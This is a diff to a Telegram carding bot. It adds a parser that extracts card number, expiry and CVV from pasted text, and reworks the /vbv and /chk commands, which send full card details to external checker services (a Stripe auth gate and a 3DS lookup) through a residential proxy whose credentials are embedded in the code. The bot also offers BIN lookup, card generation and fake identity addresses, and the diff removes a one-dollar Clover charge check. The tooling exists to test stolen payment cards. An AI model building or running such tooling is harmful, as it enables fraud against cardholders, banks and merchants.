@@ -31,6 +31,58 @@ def extract_bin(bin_input):
     year = parts[2] if len(parts) > 2 else None
     return bin_number, month, year
 
+def extract_cc_from_text(text):
+    """
+    Extract CC|MM|YY|CVV from messy formats, with or without 'Card:', newlines, Y-/C-, etc.
+    Returns: 'CC|MM|YY|CVV' or None
+    """
+    if not text:
+        return None
+
+    text = text.replace("Card:", "").replace("card:", "")
+    text = text.replace('\r', '').strip()
+
+    # 1. Pipe format (easiest)
+    m = re.search(r"(\d{12,19})\s*\|\s*(\d{2})\s*\|\s*(\d{2,4})\s*\|\s*(\d{3,4})", text)
+    if m:
+        cc, mm, yy, cvv = m.groups()
+        return f"{cc}|{mm}|{yy[-2:]}|{cvv}"
+
+    # 2. Line or mixed format
+    lines = [l.strip() for l in text.split('\n') if l.strip()]
+    cc, mm, yy, cvv = None, None, None, None
+    for l in lines:
+        if not cc:
+            m = re.search(r"\d{12,19}", l)
+            if m:
+                cc = m.group()
+        if not (mm and yy):
+            y = re.search(r"Y-?\s*(\d{2})\|(\d{2,4})", l)
+            if y:
+                mm, yy = y.group(1), y.group(2)[-2:]
+            elif re.match(r"^\d{2}\|\d{2,4}$", l):
+                mm, yy = l.split('|')[0], l.split('|')[1][-2:]
+        if not cvv:
+            c = re.search(r"C-?\s*(\d{3,4})", l)
+            if c:
+                cvv = c.group(1)
+            elif re.match(r"^\d{3,4}$", l) and len(l) in [3,4]:
+                cvv = l
+    if all([cc, mm, yy, cvv]):
+        return f"{cc}|{mm}|{yy}|{cvv}"
+
+    # 3. Attempt brute-extract (if all present somewhere)
+    numbers = re.findall(r"\d{12,19}", text)
+    mm_yy = re.findall(r"(\d{2})\|(\d{2,4})", text)
+    cvv_ = re.findall(r"\b\d{3,4}\b", text)
+    if numbers and mm_yy and cvv_:
+        cc, (mm, yy), cvv = numbers[0], mm_yy[0][0], mm_yy[0][1][-2:], cvv_[-1]
+        return f"{cc}|{mm}|{yy}|{cvv}"
+
+    return None
+    
+
+
 async def lookup_bin(bin_number):
     url = f"https://bins.antipublic.cc/bins/{bin_number[:6]}"
     async with aiohttp.ClientSession() as session:
@@ -189,7 +241,10 @@ def gen_command(message):
 
 async def generate_fake_address(country_code):
     url = f"https://randomuser.me/api/?nat={country_code}"
-    async with aiohttp.ClientSession() as session:
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36"
+    }
+    async with aiohttp.ClientSession(headers=headers) as session:
         async with session.get(url, timeout=10) as response:
             if response.status != 200:
                 raise Exception("Failed to fetch fake address.")
@@ -215,16 +270,6 @@ async def generate_fake_address(country_code):
                 "country": country
             }
 
-
-    return {
-        "full_name": f"{first_name} {last_name}",
-        "street_address": street_address,
-        "city": city,
-        "state": state,
-        "postal_code": postal_code,
-        "phone_number": phone_number,
-        "country": country
-    }
 
 @bot.message_handler(func=lambda message: message.text.startswith(("/fake", ".fake")))
 def fake_command(message):
@@ -302,149 +347,82 @@ def get_country_name_and_flag(country_code):
 
 import time
 
-@bot.message_handler(func=lambda message: message.text.startswith(("/cc", ".cc")))
-def cc_command(message):
+@bot.message_handler(func=lambda message: any(message.text.startswith(prefix) for prefix in ["/vbv", ".vbv"]))
+def universal_vbv_command(message):
     import threading
-
-    def run_async():
-        async def check_clover():
-            try:
-                parts = message.text.split()
-                if len(parts) < 2:
-                    bot.reply_to(message, "❌ PLEASE PROVIDE A CARD.")
-                    return
-
-                cc = parts[1].strip()
-                bin_number = cc.split('|')[0][:6]
-                start_time = time.time()
-
-                waiting = bot.reply_to(message, "⏳ Please wait...")
-
-                async with aiohttp.ClientSession() as session:
-                    async with session.get(f"http://luckyxd.biz:1111/clv?cc={cc}", timeout=20) as response:
-                        json_data = await response.json()
-                        result_text = json_data.get("result", "No result")
-                
-                bin_info = await lookup_bin(bin_number)
-                elapsed = round(time.time() - start_time, 2)
-
-                info = f"{bin_info.get('network', 'N/A')} - {bin_info.get('card_type', 'N/A')} - {bin_info.get('tier', 'N/A')}"
-                issuer = bin_info.get("bank", "N/A")
-                country = bin_info.get("country", "N/A")
-                flag = bin_info.get("flag", "🏳️")
-
-                verdict = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅" if "success" in result_text.lower() or "charged" in result_text.lower() or "approved" in result_text.lower() else "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
-
-                response_msg = (
-                    f"{verdict}\n\n"
-                    f"𝗖𝗮𝗿𝗱: <code>{cc}</code>\n"
-                    f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Clover 1$\n"
-                    f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {result_text}\n\n"
-                    f"𝗜𝗻𝗳𝗼: {info}\n"
-                    f"𝐈𝐬𝐬𝐮𝐞𝐫: {issuer}\n"
-                    f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country} {flag}\n\n"
-                    f"𝗧𝗶𝗺𝗲: {elapsed} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"
-                )
-
-                bot.edit_message_text(response_msg, chat_id=message.chat.id, message_id=waiting.message_id, parse_mode="HTML")
-
-            except Exception as e:
-                bot.reply_to(message, f"❌ ERROR: {e}")
-
-        asyncio.run(check_clover())
-
-    threading.Thread(target=run_async).start()
-
-
-@bot.message_handler(func=lambda message: message.text.startswith(("/vbv", ".vbv")))
-def vbv_command(message):
-    import threading
-
-    command_parts = message.text.split(' ', 1)
-    if len(command_parts) < 2:
-        bot.reply_to(message, "❌ PLEASE PROVIDE A CREDIT CARD.")
-        return
-
-    cc = command_parts[1].strip()
-    bin_number = cc.split('|')[0][:6]  # Get the BIN (first 6 digits)
 
     def run_async():
         async def async_vbv():
-            start_time = time.time()  # Record start time
-
             try:
-                result = await check_vbv(cc)  # Check the VBV status for the card
+                # Try to extract from message text after command
+                text = message.text.split(maxsplit=1)[1] if len(message.text.split(maxsplit=1)) > 1 else ""
+                cc = extract_cc_from_text(text)
+                # Or from replied message
+                if not cc and message.reply_to_message and message.reply_to_message.text:
+                    cc = extract_cc_from_text(message.reply_to_message.text)
+                if not cc:
+                    bot.reply_to(message, "❌ Could not find a valid card.")
+                    return
+
+                bin_number = cc.split('|')[0][:6]
+                start_time = time.time()
+                result = await check_vbv(cc)
                 if "error" in result:
                     bot.reply_to(message, f"❌ {result['error']}")
                     return
-                    
-                    # Fetch the bin info using the lookup_bin function
                 bin_info = await lookup_bin(bin_number)
-
-                # Extract the necessary data
                 vbv_status = result.get("vbv_status", "N/A")
-                gateway = result.get("scheme", "N/A")
                 card_type = result.get("type", "N/A")
                 bank = result.get("bank", "N/A")
-                country_code = result.get("country", "N/A")
-
-               # Get full country name and flag using the BIN Lookup API
                 country_name = bin_info.get("country", "N/A")
                 country_flag = bin_info.get("flag", "🏳️")
 
-                   # Generate response based on VBV status
                 if vbv_status == "authenticate_successful":
                     verdict = "𝗣𝗮𝘀𝘀𝗲𝗱 ✅"
                 elif vbv_status == "authenticate_failed":
                     verdict = "𝗥𝗲𝗷𝗲𝗰𝘁𝗲𝗱 ❌"
                 else:
                     verdict = "𝗥𝗲𝗷𝗲𝗰𝘁𝗲𝗱 ❌"
-                    
-                # Calculate the time taken
-                end_time = time.time()
-                time_taken = round(end_time - start_time, 2)  # Time in seconds
-
-      
-# Build the formatted response
+                elapsed = round(time.time() - start_time, 2)
                 response = (
                     f"{verdict}\n\n"
                     f"𝗖𝗮𝗿𝗱: <code>{cc}</code>\n"
- f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 3DS Lookup\n" 
-                                   f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {vbv_status}\n\n"
-                    
+                    f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 3DS Lookup\n"
+                    f"𝐑𝐞𝐬𝐩𝗼𝗻𝘀𝗲: {vbv_status}\n\n"
                     f"𝗜𝗻𝗳𝗼: {card_type}\n"
                     f"𝐈𝐬𝐬𝐮𝐞𝐫: {bank}\n"
                     f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country_name} {country_flag}\n\n"
-                    f"𝗧𝗶𝗺𝗲: {time_taken} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀"
+                    f"𝗧𝗶𝗺𝗲: {elapsed} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀"
                 )
-
                 bot.reply_to(message, response, parse_mode="HTML")
-
             except Exception as e:
                 bot.reply_to(message, f"❌ ERROR: {e}")
-
         asyncio.run(async_vbv())
 
     threading.Thread(target=run_async).start()
 
 
 
-@bot.message_handler(func=lambda message: message.text.startswith(("/chk", ".chk")))
-def chk_command(message):
+@bot.message_handler(func=lambda message: any(message.text.startswith(prefix) for prefix in ["/chk", ".chk"]))
+def universal_chk_command(message):
     try:
-        parts = message.text.split()
-        if len(parts) < 2:
-            bot.reply_to(message, "❌ PLEASE PROVIDE A CARD.")
+        # 1. Try to extract card from message (after command)
+        text = message.text.split(maxsplit=1)[1] if len(message.text.split(maxsplit=1)) > 1 else ""
+        cc = extract_cc_from_text(text)
+
+        # 2. If not found, try replied message
+        if not cc and message.reply_to_message and message.reply_to_message.text:
+            cc = extract_cc_from_text(message.reply_to_message.text)
+
+        if not cc:
+            bot.reply_to(message, "❌ Could not find a valid card.")
             return
 
-        cc = parts[1].strip()
         bin_number = cc.split('|')[0][:6]
         proxy = "http://PP_1D1E5YMPFG-country-US:5vl30ay0@evo-pro.porterproxies.com:61236"
         start_time = time.time()
-
-# Send an initial "Please wait..." message
         waiting_message = bot.reply_to(message, "⏳ Please wait...")
-        
+
         async def check_card_luckyxd():
             import httpx
             url = "http://luckyxd.biz/str"
@@ -478,7 +456,7 @@ def chk_command(message):
             f"{verdict}\n\n"
             f"𝗖𝗮𝗿𝗱: <code>{cc}</code>\n"
             f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Stripe Auth\n"
-            f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {message_clean}\n\n"
+            f"𝐑𝐞𝐬𝐩𝗼𝗻𝘀𝗲: {message_clean}\n\n"
             f"𝗜𝗻𝗳𝗼: {info}\n"
             f"𝐈𝐬𝐬𝐮𝐞𝐫: {issuer}\n"
             f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country} {flag}\n\n"
@@ -489,7 +467,6 @@ def chk_command(message):
 
     except Exception as e:
         bot.reply_to(message, f"❌ ERROR: {e}")
-
         
 
 @bot.message_handler(commands=['start'])
@@ -500,7 +477,7 @@ def start_command(message):
         "/bin :- 𝐁𝐢𝐧 𝐋𝐨𝐨𝐤𝐮𝐩\n"
         "/gen :- 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞 𝐂𝐂\n"
         "/vbv :- 𝐒𝐢𝐧𝐠𝐥𝐞 𝐕𝐁𝐕\n"
-        "/cc :- 𝐂𝐥𝐨𝐯𝐞𝐫 1$\n"
+
         "/chk :- 𝐒𝐭𝐫𝐢𝐩𝐞 𝐀𝐮𝐭𝐡\n\n"
         "Bᴏᴛ Bʏ @Newlester "
     )
@@ -516,3 +493,4 @@ if __name__ == "__main__":
         except Exception as e:
             print(f"BOT POLLING ERROR: {e}")
             time.sleep(3)
+    
